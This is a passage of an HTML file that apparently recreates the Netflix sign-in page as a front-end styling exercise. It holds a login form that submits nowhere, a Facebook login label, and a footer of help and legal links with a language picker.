            ></path>
          </g></svg
        ><span class="screen-reader-text">Netflix</span></a
      >
    </div>
    <!--from content start here-->
    <form>
      <div class="login">
        <div class="content">
          <h2 class="log_Heading">Sign In</h2>
          <input
            type="email"
            data-uia="login-field"
            name="userLoginId"
            class="input_email"
            id="id_userLoginId"
            value=""
            tabindex="0"
            autocomplete="email"
            dir=""
            placeholder="Enter email"
          />

          <div class="field">
            <div class="nfPasswordControls">
              <label class="input_id"
                ><input
                  type="password"
                  placeholder="Enter Password"
                  data-uia="password-field"
                  name="password"
                  class="nfTextField error"
                  id="id_password"
                  value=""
                  tabindex="0"
                  autocomplete="password"
                  dir=""
                /><label for="id_password" class="placeLabel"
                  >Password</label
                ></label
              >
            </div>
          </div>
          <button class="btn_sign">sign In</button>
          <div class="remberme">
            <div class="checkbox">
              <input
                type="checkbox"
                id="vehicle3"
                name="vehicle3"
                value="Boat"
              />
              <label for="vehicle3">Remember me</label><br />
            </div>
            <label>Need help ?</label>
          </div>
          <div class="facebooksingin">
            <div><img src="fb_img.png" alt="" height="22px"width: 22px/></div>
            <div class="fb">
              <label>Login with Faceboook</label>
            </div>
          </div>

          <div class="oter_text">
            <div class="tetx">
              <h3>
                New to Netflix?
                <h3 style="color: white">Sign up now.</h3>
                
            
            </div>
            <div>
              <label>
                This page is protected by Google reCAPTCHA to ensure you're not
                a bot.

                <a href="#"> Learn more.</a>
              </label>
            </div>
          </div>
        </div>
      </div>
    </form>

    <!-- Hello this is footer -->

    <div class="site-footer-wrapper centered">
      <div class="footer-divider"></div>
      <div class="site-footer">
        <p class="footer-top">
          Questions? Call
          <a class="footer-top-a" href="tel:000-800-040-1843 "
            >000-800-040-1843
          </a>
        </p>
        <ul class="footer-links structural">
          <li
            class="footer-link-item"
            placeholder="footer_responsive_link_faq_item"
          >
            <a
              class="footer-link"
              data-uia="footer-link"
              href="https://help.netflix.com/support/412"
              placeholder="footer_responsive_link_faq"
            >
              <span id="" data-uia="data-uia-footer-label">FAQ</span></a
            >
          </li>
          <li
            class="footer-link-item"
            placeholder="footer_responsive_link_help_item"
          >
            <a
              class="footer-link"
              data-uia="footer-link"
              href="https://help.netflix.com"
              placeholder="footer_responsive_link_help"
              ><span id="" data-uia="data-uia-footer-label"
                >Help Centre</span
              ></a
            >
          </li>
          <li
            class="footer-link-item"
            placeholder="footer_responsive_link_terms_item"
          >
            <a
              class="footer-link"
              data-uia="footer-link"
              href="https://help.netflix.com/legal/termsofuse"
              placeholder="footer_responsive_link_terms"
              ><span id="" data-uia="data-uia-footer-label">Terms of Use</span>
            </a>
          </li>
          <li
            class="footer-link-item"
            placeholder="footer_responsive_link_privacy_separate_link_item"
          >
            <a
              class="footer-link"
              data-uia="footer-link"
              href="https://help.netflix.com/legal/privacy"
              placeholder="footer_responsive_link_privacy_separate_link"
              ><span id="" data-uia="data-uia-footer-label">Privacy</span></a
            >
          </li>
          <li
            class="footer-link-item"
            placeholder="footer_responsive_link_cookies_separate_link_item"
          >
            <a
              class="footer-link"
              data-uia="footer-link"
              href="#"
              placeholder="footer_responsive_link_cookies_separate_link"
              ><span id="" data-uia="data-uia-footer-label"
                >Cookie Preferences</span
              ></a
            >
          </li>
          <li
            class="footer-link-item"
            placeholder="footer_responsive_link_corporate_information_item"
          >
            <a
              class="footer-link"
              data-uia="footer-link"
              href="https://help.netflix.com/legal/corpinfo"
              placeholder="footer_responsive_link_corporate_information"
              ><span id="" data-uia="data-uia-footer-label"
                >Corporate Information</span
              ></a
            >
          </li>
        </ul>
        <div class="lang-selection-container" id="lang-switcher">
          <div data-uia="language-picker+container" class="ui-select-wrapper">
            <label for="lang-switcher-select" class="ui-label"
              ><span class="ui-label-text">Select Language</span></label
            >
            <div class="select-arrow medium prefix globe">
              <select
                data-uia="language-picker"
                class="ui-select medium"
                id="lang-switcher-select"
                tabindex="0"
                placeholder="lang-switcher"
              >
                <option
                  selected=""
                  lang="en"
                  value="/?locale=en-IN"
                  data-language="en"
                  data-country="IN"
                >
                  English
                </option>
                <option
                  lang="hi"
                  value="/?locale=hi-IN"
                  data-language="hi"
                  data-country="IN"
                >
                  हिन्दी
                </option>
              </select>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
